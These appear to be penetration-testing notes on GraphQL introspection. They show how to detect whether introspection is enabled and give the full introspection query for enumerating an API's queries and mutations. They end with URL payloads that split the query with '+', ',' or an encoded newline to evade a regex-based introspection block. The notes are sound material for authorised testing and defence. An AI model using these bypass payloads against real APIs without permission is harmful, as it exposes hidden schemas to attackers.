Introspection:

Introspection → Get API to describe itself

  • is introspection enabled?
    • If we recieve a valid response from this we can say it’s enabled.
{
"query":"query {__schema{queryType{name}}}"
}


example.com/graphql?query={__schema{types{name}}}

Full introspection payload:

  • discover mutations and queries we can perform
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
  • Or alternatively use InQL
  • Queries get data from the API (similar to GET requests)
  • Mutations usually change the users state (similar to POST)

We can bypass introspection query check regex by trying to break up a introspection query

example.com/graphql?query={__schema+{types{name}}}
example.com/graphql?query={__schema,{types{name}}}
example.com/graphql?query={__schema%0A{types{name}}}
